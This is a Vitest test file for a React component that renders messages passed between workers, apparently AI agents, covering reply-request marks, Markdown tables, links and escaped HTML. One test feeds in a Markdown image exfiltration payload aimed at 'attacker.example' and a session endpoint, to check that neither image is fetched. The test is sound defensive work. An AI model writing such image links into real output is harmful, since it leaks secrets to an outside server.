// @vitest-environment happy-dom
/**
 * A received message that asks for a reply is marked as one: its sender is
 * owed this worker's answer (FIX-2310, FIX-2318), so someone watching the
 * conversation has to tell it apart from a plain message, which wants nothing back.
 *
 * Its text is drawn as Markdown, as the worker's own replies are: a
 * worker that answers with a table or a link wrote it for the user to read, and
 * shown raw it reads as pipes, which pushed the Shift Coordinator to restate it.
 * HTML in it stays text: another worker wrote it.
 */
import { cleanup, render, screen } from "@testing-library/react";
import type { DataItem } from "@flow-state-dev/core/items";
import { afterEach, describe, expect, it } from "vitest";
import { ReceivedMessage } from "../src/components/ReceivedMessage";

afterEach(cleanup);

function received(value: Record<string, unknown>): DataItem {
  return { type: "data", id: "it_1", ts: 0, value: { id: "msg_1", from: "eng.author", text: "the codename?", ...value } } as unknown as DataItem;
}

describe("a received message", () => {
  it("marks a reply request, since its sender is owed this worker's answer", () => {
    render(<ReceivedMessage item={received({ replyRequested: true })} />);
    expect(screen.getByTestId("received-message").dataset.replyRequested).toBe("true");
    expect(screen.getByTestId("received-message-reply-requested").textContent).toBe("asks for a reply · the reply goes back");
  });

  it("marks a reply request that answers a message of this worker's with both notes", () => {
    render(<ReceivedMessage item={received({ replyRequested: true, inReplyTo: "msg_0" })} />);
    expect(screen.getByTestId("received-message-answers")).toBeTruthy();
    expect(screen.getByTestId("received-message-reply-requested")).toBeTruthy();
  });

  it("draws a plain message without the mark, and an item with no flag as a plain message", () => {
    render(<ReceivedMessage item={received({})} />);
    expect(screen.getByTestId("received-message").dataset.replyRequested).toBe("false");
    expect(screen.queryByTestId("received-message-reply-requested")).toBeNull();
  });
});

// FIX-2792.
describe("a received message's text", () => {
  /** The message's text, as drawn. */
  const textOf = () => screen.getByTestId("received-message").querySelector('[data-look="received-message-text"]')!;
  const TABLE = ["Here is what failed:", "", "| task | error |", "| --- | --- |", "| task_3f5e | timeout |"].join("\n");

  it("draws a Markdown table as a table, not as pipes", () => {
    render(<ReceivedMessage item={received({ text: TABLE })} />);
    const text = textOf();
    const cells = [...text.querySelectorAll("td")].map((cell) => cell.textContent);
    expect(cells).toEqual(["task_3f5e", "timeout"]);
    expect(text.textContent).not.toContain("| --- |");
  });

  it("makes a URL a link", () => {
    render(<ReceivedMessage item={received({ text: "See https://github.com/acme/web/pull/12 for the fix." })} />);
    // Streamdown draws a link as its own control, which asks before it opens the page.
    const link = textOf().querySelector('[data-streamdown="link"]');
    expect(link?.textContent).toBe("https://github.com/acme/web/pull/12");
  });

  it("shows HTML in the text as text, never as an element", () => {
    render(<ReceivedMessage item={received({ text: "a <b>loud</b> b" })} />);
    expect(textOf().querySelector("b")).toBeNull();
    expect(textOf().textContent).toContain("<b>loud</b>");
  });

  // An image in Markdown is fetched the moment the message is drawn, before anyone
  // clicks: its address could carry what another worker read to a server it names.
  it("never fetches an image the text names, remote or relative", () => {
    const text = "![chart](https://attacker.example/c?d=secret) and ![x](/api/sessions?leak=1)";
    render(<ReceivedMessage item={received({ text })} />);
    const sources = [...document.querySelectorAll("img")].map((img) => img.getAttribute("src"));
    expect(sources.some((src) => src?.includes("attacker.example"))).toBe(false);
    expect(sources.some((src) => src?.includes("/api/sessions"))).toBe(false);
    // Each image is still named, by its alt text.
    expect(textOf().textContent).toContain("chart");
  });
});
